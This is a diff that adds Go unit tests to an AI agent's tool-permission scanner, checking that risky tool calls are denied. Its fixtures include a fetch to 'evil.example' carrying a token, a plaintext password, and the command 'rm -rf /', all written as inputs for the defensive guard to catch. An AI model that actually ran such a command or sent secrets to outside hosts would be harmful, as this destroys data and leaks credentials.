@@ -139,6 +139,85 @@ func TestPermissionPolicyScansOpenWorldMCPArguments(t *testing.T) {
 	require.Contains(t, decision.Reason, string(RuleNetworkEgress))
 }
 
+func TestPermissionPolicyRedactsInvalidURLQuerySecrets(t *testing.T) {
+	decision, err := newTestScanner(t).CheckToolPermission(
+		context.Background(),
+		&tool.PermissionRequest{
+			ToolName: "fetch_document",
+			Arguments: []byte(
+				`{"url":"https://evil.example/%zz?token=$TOKEN"}`,
+			),
+			Metadata: tool.ToolMetadata{OpenWorld: true},
+		},
+	)
+	require.NoError(t, err)
+	require.Equal(t, tool.PermissionActionDeny, decision.Action)
+	require.Contains(t, decision.Reason, string(RuleNetworkEgress))
+	require.NotContains(t, decision.Reason, "$TOKEN")
+}
+
+func TestPermissionPolicyScansStringMapKeys(t *testing.T) {
+	decision, err := newTestScanner(t).CheckToolPermission(
+		context.Background(),
+		&tool.PermissionRequest{
+			ToolName: "fetch_documents",
+			Arguments: []byte(
+				`{"targets":{"https://evil.example/document":true}}`,
+			),
+			Metadata: tool.ToolMetadata{OpenWorld: true},
+		},
+	)
+	require.NoError(t, err)
+	require.Equal(t, tool.PermissionActionDeny, decision.Action)
+	require.Contains(t, decision.Reason, string(RuleNetworkEgress))
+}
+
+func TestPermissionPolicyPreservesStructuredSecretContext(t *testing.T) {
+	decision, err := newTestScanner(t).CheckToolPermission(
+		context.Background(),
+		&tool.PermissionRequest{
+			ToolName: "remote_action",
+			Arguments: []byte(
+				`{"credentials":{"password":"hunter2"}}`,
+			),
+		},
+	)
+	require.NoError(t, err)
+	require.Equal(t, tool.PermissionActionDeny, decision.Action)
+	require.Contains(t, decision.Reason, string(RuleSecretExposure))
+	require.NotContains(t, decision.Reason, "hunter2")
+}
+
+func TestPermissionPolicyRejectsDeepArguments(t *testing.T) {
+	arguments := `{"payload":` + strings.Repeat("[", maxPermissionArgumentDepth+1) +
+		`"value"` + strings.Repeat("]", maxPermissionArgumentDepth+1) + `}`
+	decision, err := newTestScanner(t).CheckToolPermission(
+		context.Background(),
+		&tool.PermissionRequest{
+			ToolName:  "remote_action",
+			Arguments: []byte(arguments),
+		},
+	)
+	require.NoError(t, err)
+	require.Equal(t, tool.PermissionActionDeny, decision.Action)
+	require.Contains(t, decision.Reason, string(RuleResourceAbuse))
+}
+
+func TestPermissionPolicyScansCommandAlongsideCodeBlocks(t *testing.T) {
+	decision, err := newTestScanner(t).CheckToolPermission(
+		context.Background(),
+		&tool.PermissionRequest{
+			ToolName: "mixed_executor",
+			Arguments: []byte(
+				`{"command":"rm -rf /","code_blocks":[{"language":"go","code":"fmt.Println(1)"}]}`,
+			),
+		},
+	)
+	require.NoError(t, err)
+	require.Equal(t, tool.PermissionActionDeny, decision.Action)
+	require.Contains(t, decision.Reason, string(RuleDangerousDelete))
+}
+
 func TestPermissionPolicyRejectsSecretInOpaqueArguments(t *testing.T) {
 	decision, err := newTestScanner(t).CheckToolPermission(
 		context.Background(),
